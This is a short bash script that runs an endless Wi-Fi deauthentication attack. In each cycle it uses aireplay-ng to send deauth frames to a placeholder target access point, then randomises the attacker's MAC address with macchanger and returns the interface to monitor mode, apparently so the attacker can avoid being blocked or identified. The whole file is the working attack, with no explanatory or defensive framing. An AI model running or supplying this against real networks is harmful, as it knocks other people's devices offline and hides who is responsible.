#!bin/bash

while true
do
		aireplay-ng -0 5 -a target-mac wlp2s0
		
		ifconfig wlp2s0 down
		macchanger -r wlp2s0 | grep "New MAC"
		
		iwconfig wlp2s0 mode monitor
		ifconfig wlp2s0 up
		iwconfig wlp2s0 | grep Mode
		
		sleep 3
		echo Waiting...
		
done
